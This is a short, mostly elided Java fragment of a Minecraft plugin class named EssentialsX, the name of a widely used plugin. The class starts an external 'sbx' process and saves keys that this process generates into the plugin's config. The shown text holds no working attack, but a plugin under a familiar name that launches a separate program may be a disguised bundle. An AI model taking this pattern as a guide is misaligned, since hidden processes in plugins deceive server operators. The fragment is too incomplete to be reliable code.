...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        // NEW: Load saved keys from config.yml (these are keys generated by sbx on first run)
        ...
        // NEW: If we don't have saved keys yet, start monitoring for keys file
        if (!areKeysSaved()) {
    ...
    private boolean areKeysSaved() {
        FileConfiguration config = getConfig();
        // Check if at least one of the typical generated keys exists
